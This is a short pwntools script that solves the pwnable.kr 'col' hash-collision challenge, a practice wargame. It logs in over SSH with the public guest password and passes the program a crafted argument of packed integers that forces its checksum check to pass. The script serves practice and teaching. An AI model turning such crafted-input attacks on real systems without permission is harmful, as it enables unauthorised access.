from pwn import *

shell = ssh('col' ,'pwnable.kr' ,password='guest', port=2222)

payload = p32(0x6c5cec8) * 4 + p32(0x6c5cecc)

process = shell.process(executable='./col', argv=['col', payload])
print(process.recvall().decode())

process.close()
shell.close()